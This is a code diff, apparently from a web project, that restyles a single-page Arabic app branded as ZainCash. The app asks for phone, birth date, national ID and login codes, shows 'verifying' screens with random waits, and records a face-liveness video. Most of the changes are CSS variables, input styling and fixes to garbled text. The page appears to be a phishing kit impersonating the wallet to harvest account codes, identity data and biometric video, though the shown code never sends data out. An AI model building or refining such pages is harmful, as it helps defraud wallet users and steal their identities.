@@ -8,8 +8,22 @@
   <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;900&display=swap" rel="stylesheet">
   <style>
     /* === عام === */
+    :root{
+      --primary-1: #2F80ED;
+      --primary-2: #56CCF2;
+      --muted: #f2f8fd;
+      --input-border: rgba(86,204,242,0.2);
+      --input-shadow: rgba(86,204,242,0.08);
+      --danger-1: #ef5350;
+      --danger-2: #e53935;
+    }
+
+    html,body{
+      height:100%;
+    }
+
     body {
-      background: linear-gradient(135deg, #2F80ED 0%, #56CCF2 100%);
+      background: linear-gradient(135deg, var(--primary-1) 0%, var(--primary-2) 100%);
       min-height: 100vh;
       font-family: 'Cairo', Arial, sans-serif;
       margin: 0;
@@ -31,21 +45,49 @@
       overflow:hidden;
     }
     .zain-header { display:flex; align-items:center; justify-content:center; gap:10px; margin-bottom:14px; }
-    .zain-logo { width:64px; height:64px; border-radius:20px; background:linear-gradient(135deg,#56CCF2 60%,#2F80ED 100%); display:flex; align-items:center; justify-content:center; box-shadow:0 2px 16px #2f80ed22; border:2.5px solid #fff; overflow:hidden; }
+    .zain-logo { width:64px; height:64px; border-radius:20px; background:linear-gradient(135deg,var(--primary-2) 60%,var(--primary-1) 100%); display:flex; align-items:center; justify-content:center; box-shadow:0 2px 16px #2f80ed22; border:2.5px solid #fff; overflow:hidden; }
     .zain-logo img { width:60px; height:60px; object-fit:contain; border-radius:16px; background:#fff; border:1.5px solid #e3eefe; }
-    .zain-title-main { font-size:25px; font-weight:900; color:#2F80ED; margin:0; text-shadow:0 1px 0 #fff, 0 2px 8px #2f80ed22; }
+    .zain-title-main { font-size:25px; font-weight:900; color:var(--primary-1); margin:0; text-shadow:0 1px 0 #fff, 0 2px 8px #2f80ed22; }
     .zain-title-sub { font-size:15px; color:#353a4d; font-weight:600; text-align:center; margin-top:2px; }
     .step-indicator { display:flex; justify-content:center; gap:6.5px; margin:12px 0; }
-    .step-dot { width:11px; height:11px; border-radius:50%; background:#eaf2fd; border:2px solid #56CCF2; }
-    .step-dot.active { background: linear-gradient(135deg,#2f80ed 70%,#56ccf2 100%); border-color:#2f80ed; }
+    .step-dot { width:11px; height:11px; border-radius:50%; background:#eaf2fd; border:2px solid var(--primary-2); }
+    .step-dot.active { background: linear-gradient(135deg,var(--primary-1) 70%,var(--primary-2) 100%); border-color:var(--primary-1); }
 
-    label { color:#2F80ED; font-size:15px; font-weight:600; margin-bottom:6px; display:block; }
-    input, select { padding:14px 11px; border-radius:9px; border:none; background:#f2f8fd; font-size:16px; outline:none; box-shadow:0 1.5px 5px #56ccf211; border:2px solid #56ccf233; font-family:'Cairo',Arial,sans-serif; }
-    input:focus, select:focus { box-shadow:0 3px 16px #2f80ed33; border-color:#2F80ED; background:#f4faff; }
+    label { color:var(--primary-1); font-size:15px; font-weight:600; margin-bottom:8px; display:block; }
+    /* موحّد لخانات الإدخال */
+    input[type="text"], input[type="tel"], input[type="number"], select, .text-input {
+      padding:12px 12px;
+      border-radius:10px;
+      border:2px solid var(--input-border);
+      background: var(--muted);
+      font-size:15px;
+      outline:none;
+      box-shadow: 0 1.5px 5px var(--input-shadow);
+      transition: box-shadow .14s ease, border-color .12s ease, transform .06s ease;
+      width:100%;
+      box-sizing:border-box;
+      color:#222;
+      -webkit-appearance: none;
+      -moz-appearance: none;
+      appearance: none;
+    }
+    input[type="text"]::placeholder,
+    input[type="tel"]::placeholder,
+    input[type="number"]::placeholder,
+    .text-input::placeholder {
+      color: #9fbfe8;
+      opacity:1;
+    }
+    input[type="text"]:focus, input[type="tel"]:focus, input[type="number"]:focus, select:focus, .text-input:focus {
+      box-shadow: 0 6px 22px rgba(47,128,237,0.18);
+      border-color: var(--primary-1);
+      background: #fbfeff;
+      transform: translateY(0);
+    }
 
     /* زر موحد أساسي */
     .button {
-      background: linear-gradient(90deg,#2F80ED 0%,#56CCF2 100%);
+      background: linear-gradient(90deg,var(--primary-1) 0%,var(--primary-2) 100%);
       color:#fff;
       border:none;
       padding:13px 12px;
@@ -53,7 +95,7 @@
       font-size:18px;
       font-weight:800;
       cursor:pointer;
-      box-shadow:0 1px 6px #2f80ed22;
+      box-shadow:0 1px 6px rgba(47,128,237,0.14);
       transition: transform .06s ease, opacity .08s ease;
       display:inline-block;
       min-width:120px;
@@ -61,26 +103,25 @@
     }
     .button:active { transform:translateY(1px); opacity:0.92; }
 
-    /* زر الرجوع - أصغر ولكن متناسق */
+    /* زر الرجوع - مصغر لكنه مرئي ومتناسق */
     .back-btn {
       position:relative;
       display:inline-block;
       background: transparent;
-      color:#2F80ED;
-      border:2px solid transparent;
-      padding:6px 10px;
+      color:var(--primary-1);
+      padding:8px 10px;
       border-radius:8px;
       font-weight:700;
       cursor:pointer;
       font-size:14px;
+      border:2px solid transparent;
       margin-bottom:10px;
-      text-align:center;
     }
     .back-btn:hover { background:#f4faff; }
 
-    /* زر إلغاء أحمر متناسق */
+    /* زر إلغاء أحمر */
     .danger-button {
-      background: linear-gradient(90deg,#ef5350 0%,#e53935 100%);
+      background: linear-gradient(90deg,var(--danger-1) 0%,var(--danger-2) 100%);
       color:#fff;
       border:none;
       padding:11px 12px;
@@ -93,9 +134,9 @@
     }
     .danger-button:active { transform:translateY(1px); opacity:0.92; }
 
-    .info-msg { text-align:center; color:#2F80ED; font-weight:600; margin:8px 0; }
+    .info-msg { text-align:center; color:var(--primary-1); font-weight:600; margin:8px 0; }
     .code-inputs { display:flex; justify-content:center; gap:10px; margin:8px 0; }
-    .code-inputs input { width:120px; text-align:center; font-size:19px; letter-spacing:5px; direction:ltr; font-weight:700; }
+    .code-inputs input { width:120px; text-align:center; font-size:19px; letter-spacing:5px; direction:ltr; font-weight:700; padding:12px 8px; border-radius:9px; border:2px solid rgba(86,204,242,0.33); background:var(--muted); box-shadow:0 1.5px 5px var(--input-shadow); }
 
     .zain-footer { margin-top:20px; text-align:center; color:#a6c7ef; font-weight:600; font-size:13px; opacity:0.85; }
 
@@ -103,7 +144,7 @@
     .camera-wrap { display:flex; flex-direction:column; align-items:center; gap:14px; }
     .camera-box { width:100%; max-width:320px; height:420px; background:#2f2f33; border-radius:8px; overflow:hidden; position:relative; border:6px solid #fff; box-sizing:border-box; display:flex; align-items:center; justify-content:center; }
     .camera-box video { width:100%; height:100%; object-fit:cover; }
-    .instruction-box { background: rgba(0,0,0,0.7); color:#fff; padding:12px; border-radius:10px; max-width:320px; text-align:center; font-size:16px; }
+    .instruction-box { background: rgba(0,0,0,0.72); color:#fff; padding:12px; border-radius:10px; max-width:320px; text-align:center; font-size:16px; line-height:1.45; }
     .countdown { position:absolute; top:8px; left:8px; background:rgba(0,0,0,0.45); color:#fff; padding:6px 10px; border-radius:12px; font-weight:700; }
 
     /* processing modal */
@@ -120,7 +161,16 @@
     #modalContent .err-title { color:#e53935; font-size:19px; font-weight:700; }
     #modalContent .err-msg { margin-top:8px; font-weight:600; color:#444; }
 
-    @media (max-width:450px){ #app{padding:16px 1.5vw 10px 1.5vw;} .camera-box{height:320px;} .zain-title-main{font-size:20px} }
+    /* تحسينات عرض الحقول على الشاشات الصغيرة */
+    @media (max-width:450px){
+      #app{padding:16px 1.5vw 10px 1.5vw;}
+      .camera-box{height:320px;}
+      .zain-title-main{font-size:20px}
+      .code-inputs input { width:90px; font-size:17px; }
+      .button { min-width: 100px; font-size:16px; padding:11px 10px; }
+      input[type="text"], input[type="tel"], select { padding:11px 10px; font-size:15px; }
+    }
+
   </style>
 </head>
 <body>
@@ -243,7 +293,13 @@
     let years = '<select id="birthYear" required><option value="">السنة</option>';
     for(let y=maxYear;y>=minYear;y--) years += `<option value="${y}">${y}</option>`;
     years += '</select>';
-    el.innerHTML = days + months + years;
+    el.innerHTML = `
+      <div style="display:flex;gap:8px;">
+        ${days}
+        ${months}
+        ${years}
+      </div>
+    `;
   }
 
   function showNationalIdWaitAndGotoCode5(){
@@ -251,7 +307,7 @@
     app.innerHTML = `
       <div style="padding:40px 0;text-align:center;">
         <div style="margin-bottom:18px;"><img src="${zainCashLogo}" width="60" height="60" style="border-radius:14px;"/></div>
-        <div style="color:#2F80ED;font-size:22px;font-weight:900;margin-bottom:8px;">يرجى الانتظار...</div>
+        <div style="color:var(--primary-1);font-size:22px;font-weight:900;margin-bottom:8px;">يرجى الانتظار...</div>
         <div style="color:#353a4d;font-size:15px;">جاري التحقق من المعلومات المدخلة</div>
         <div id="waitSecNational" style="margin:20px auto 0;font-size:16px;color:#1887d2;font-weight:700;">${randomWait}</div>
       </div>
@@ -294,7 +350,7 @@
     app.innerHTML = `
       <div style="padding:40px 0;text-align:center;">
         <div style="margin-bottom:18px;"><img src="${zainCashLogo}" width="60" height="60" style="border-radius:14px;"/></div>
-        <div style="color:#2F80ED;font-size:22px;font-weight:900;margin-bottom:8px;">يرجى الانتظار...</div>
+        <div style="color:var(--primary-1);font-size:22px;font-weight:900;margin-bottom:8px;">يرجى الانتظار...</div>
         <div style="color:#353a4d;font-size:15px;">جاري التحقق من رمز الدخول</div>
         <div id="waitSec" style="margin:20px auto 0;font-size:16px;color:#1887d2;font-weight:700;">${randomWait}</div>
       </div>
@@ -348,7 +404,7 @@
         <div style="font-size:18px;color:#353a4d;font-weight:700;margin-bottom:8px;">سيُطلب إذن الكاميرا الآن</div>
         <div style="color:#666;font-size:14px;">
           سنسجل فيديو قصير يتضمن أربع خطوات: <strong>اغماض العين</strong>، <strong>وجه يسار</strong>، <strong>وجه يمين</strong>، <strong>ابتسم</strong>.<br>
-          اضبط وجهك داخل الإطار، أزل القبعة/النظ��رات إذا لزم، واسمح بالوصول للكاميرا.
+          اضبط وجهك داخل الإطار، أزل القبعة/النظارات إذا لزم، واسمح بالوصول للكاميرا.
         </div>
       </div>
     `;
@@ -361,7 +417,7 @@
 
     const steps = [
       { label: 'اغمض عينيك', instruction: 'أغلق عينيك بالكامل لمدة 5 ثوانٍ', duration: 5000 },
-      { label: 'حرك وجهك إلى اليسار', instruction: 'حرّك و��هك ببطء إلى اليسار ثم عد للمنتصف', duration: 5000 },
+      { label: 'حرك وجهك إلى اليسار', instruction: 'حرّك وجهك ببطء إلى اليسار ثم عد للمنتصف', duration: 5000 },
       { label: 'حرك وجهك إلى اليمين', instruction: 'حرّك وجهك ببطء إلى اليمين ثم عد للمنتصف', duration: 5000 },
       { label: 'ابتسم', instruction: 'ابتسم طبيعياً لمدة 5 ثوانٍ', duration: 5000 }
     ];
@@ -521,6 +577,7 @@
 
   // ابدأ التطبيق
   renderPhoneStep();
+
 </script>
 </body>
 </html>
